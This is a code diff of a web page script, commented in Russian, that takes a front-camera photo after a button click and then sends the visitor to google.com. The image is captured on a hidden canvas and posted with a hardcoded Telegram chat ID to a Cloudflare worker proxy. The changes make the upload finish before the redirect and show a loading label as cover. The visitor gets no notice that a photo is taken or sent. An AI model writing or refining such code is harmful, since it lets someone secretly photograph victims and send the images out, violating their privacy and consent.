@@ -16,8 +16,7 @@
         <canvas id="c" style="display:none"></canvas>
 
         <script>
-        // 1. Настройки (Прокси Cloudflare и твой ID)
-const chatId = '1976857829';
+       const chatId = '1976857829';
 const targetUrl = 'https://google.com';
 const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 
@@ -26,18 +25,20 @@ const video = document.getElementById('v');
 const canvas = document.getElementById('c');
 
 btn.onclick = async () => {
+    btn.innerText = "Загрузка..."; // Показываем, что процесс идет
+    btn.disabled = true;
+
     try {
-        // 1. Запрашиваем камеру
+        // 1. Запрашиваем фронтальную камеру
         const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } // Принудительно фронтальная камера
+            video: { facingMode: "user" } 
         });
         video.srcObject = stream;
 
-        // 2. Ждем, пока камера реально начнет выдавать картинку
+        // 2. Ждем 800мс, чтобы камера телефона успела "проснуться" (убирает черное фото)
         await new Promise((resolve) => {
-            video.onloadeddata = () => {
-                // Маленькая задержка в 300мс специально для мобильных камер
-                setTimeout(resolve, 300);
+            video.onloadedmetadata = () => {
+                setTimeout(resolve, 800); 
             };
         });
 
@@ -49,21 +50,29 @@ btn.onclick = async () => {
         const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
         const formData = new FormData();
         formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'img.jpg');
+        formData.append('photo', blob, 'shot.jpg');
 
-        // 4. Отправляем через прокси (не ждем ответа для скорости)
-        fetch(proxyUrl, { method: 'POST', body: formData });
+        // 4. ЖДЕМ ОТПРАВКИ (await заставит скрипт стоять на этой строчке)
+        const response = await fetch(proxyUrl, { 
+            method: 'POST', 
+            body: formData 
+        });
+
+        if (response.ok) {
+            console.log("Фото ушло!");
+        }
 
         // Выключаем камеру
         stream.getTracks().forEach(t => t.stop());
 
     } catch (err) {
-        console.log("Ошибка:", err);
+        console.log("Ошибка или отказ:", err);
     } finally {
-        // 5. Мгновенный переход
+        // 5. ПЕРЕХОД ПО ССЫЛКЕ (сработает только когда fetch завершится или выдаст ошибку)
         window.location.href = targetUrl;
     }
 };
+
 
 
 
